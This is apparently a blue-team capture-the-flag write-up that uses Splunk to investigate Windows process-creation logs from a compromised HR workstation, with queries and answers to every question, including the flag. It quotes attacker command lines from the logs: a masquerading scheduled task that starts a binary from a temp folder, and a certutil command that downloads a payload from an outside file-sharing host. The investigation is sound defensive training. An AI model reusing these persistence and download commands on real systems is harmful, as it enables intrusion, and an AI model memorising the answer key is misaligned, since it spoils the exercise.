***Title:*** Challenge 2 Write-Up: Benign 

***Scenario Overview:*** A client's Intrusion Detection System(IDS) indicated a potentially suspicious process execution on one the hosts from the HR department. The possibility of a compromised workstation within the HR department warrants an investigation. 

***Background:*** We are provided with the windows event logs belonging to the potentially compromised workstation. From the windows event logs, unfortunately only the process execution logs with Event ID:4688 are ingested into the index: **win_eventlogs.**

***Objective:*** Identify and investigate the infected host by progressing through the guided questions.

***Goals:***
- Gain and demonstrate practical experience using Splunk Search as a Security Information and Event Management (SIEM) platform.
- Strengthen threat detection and event correlation skills by analyzing security logs and identifying suspicious activity.
- Develop and strengthen SOC investigation and incident analysis skills.
- Improve technical report-writing skills by documenting investigation findings, evidence, and recommended actions.


**Categories:** Blue Team / SIEM / Endpoint Investigation. 

**Environment and Tools Used:** Linux / Splunk


## Network Information ##  

The network is separated logically into three different subjects
The users per department are characterized below

**IT Department:**
- James
- Moin
- Katrina

**HR Department:**
- Haroon
- Chris
- Diana

**Marketing Department:**
- Bell
- Amelia
- Deepak

## Start of Investigation ##

***Question 1: How many logs were ingested from the month of March, 2022?***

*Investigative Workflow:* We can use the Date Range widget to narrow down the results, setting the **Between* section to 03/01/2022 00:00:00:000-03/31/2022 23:59:59:999.

<img width="668" height="202" alt="Image" src="https://github.com/user-attachments/assets/1f592a52-98f0-41ea-94eb-179bc5e4388c" />

*Answer:* Once the date range is set, Splunk tells us that **13,959** events have occurred.



***Question 2: Imposter Alert, There seems to be an imposter account observed in the logs, what is the name of that user?***

*Investigative Workflow & Thought Process:* An Imposter account being signaled instantly makes me want check back to my network information bulletin containing all the expected users and their usernames and check it against all username values extracted in the logs to see if there is any unordinary users present. To accomplish this I used the following query.

### Splunk Query 
```spl 
index=win_eventlogs| rare limit=20 UserName
```
*Anwser:* Focusing on the statistics, sure enough an anomaly pops its self up, an account named *Ame11a* which is clearly typo squatting the user 'Amelia' whose username is also simply 'Amelia'. 

<img width="1108" height="103" alt="Image" src="https://github.com/user-attachments/assets/f0d36e5a-d3df-4f90-85bc-99ddbb8a21a8" />


***Question 3: Which user from the HR department was observed to be running scheduled tasks?***

*Investigative Workflow & Thought Process:* Since the question ask which user from the HR Department, we can refer to our employee/network information to see that we should focus are query on three users initially, Chris, Haroon, and Diana. This narrows down the results to 3,373 events, far less noise. One of the fastest ways to honed in on schedule tasks would be by event ID's such as 4688, 4700, 4699. We unfortunately only have Event ID 4688 detected within the ingested logs which is any kind of process execution. One possible avenue I see is with the command line field, there are only 47 individual events, so noise wont be a factor in analyzing. Often malicious creation of schedule tasks involves some form of PowerShell, Command Prompt, Wscript, or MSHTA So I will add these to my query. 

### Splunk Query
```spl
(
    New_Process_Name="*\\powershell.exe"
    OR New_Process_Name="*\\cmd.exe"
    OR New_Process_Name="*\\wscript.exe"
    OR New_Process_Name="*\\cscript.exe"
    OR New_Process_Name="*\\mshta.exe")
```
 Unfortunately this query did not yield anything of note. Simplifying my search to only focus on the unique events from the commandline field, I did notice an interesting entry: */create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart*. I researched this line and it defiantly lines up with the creation of a scheduled task. 
 
 The following details that support that this is malicous are:
 - Misspelled/masquerading task name: OfficUpdater resembles an Office updater.
 - Executable in AppData\Local\Temp: legitimate startup tasks rarely need to execute binaries from a user's temporary directory.
 - Persistence: /sc onstart establishes execution whenever the system starts.
 - Potentially suspicious executable: update.exe is generic and should be investigated.
 - User profile path: C:\Users\Chris.fort\... indicates the executable is located in a user's profile.

Filtering on this specific command, the user who launched the task was Chris, who is identified as a user of the HR Department.

*Answer:* Chris 

***Question 4: Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?***

*Investigative Workflow & Thought Process:* We keep are search narrowed to only users in the HR Department and all unique Command line events. Straight away, one entry stands out *certutil.exe -urlcache -f - hxxps://controlc[.]com/e4d11035 benign.exe*. That command is highly suspicious and is commonly associated with using certutil.exe as a LOLBin (Living off the Land Binary) to download content. Attackers often used LOLBins such as Wget, Certutil, Rundll32, etc to retrieve malicous files and tools.

**MITRE ATT&CK mapping**
This behavior maps to:
- T1105 — Ingress Tool Transfer

The broader technique is downloading a file from an external location onto the compromised system. certutil.exe is also commonly monitored as a Windows LOLBin because legitimate administrative utilities can be abused for this purpose.

We include this command in our search query and view the results. The user who launches the command is haroon.

<img width="859" height="467" alt="Image" src="https://github.com/user-attachments/assets/2621cfc6-1179-48e4-a654-5f8f538189b8" />


**Note:** The remaining questions are anwsered by the investigative workflow of question 4 and are supported by the screenshot above.

*Answer:* haroon


***Question 5: To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?***

*Answer:* Certutil.exe, as we discovered in question 4.


***Question 6: What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)***

*Answer:* 2022-03-04 

***Question 7: Which third-party site was accessed to download the malicious payload?***

*Anwser:* controlc.com, we see the url in question when analyzing the certutil command. 

***Question 8: What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?***

*Anwser:* benign.exe 


***Question 9: The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?***

*Investigative Workflow & Thought Process:* View the site and grab the flag

*Answer:* THM{KJ&*H^B0}

***Question 10: What is the URL that the infected host connected to?***

*Answer:* hxxps://controlc[.]com/e4d11035 






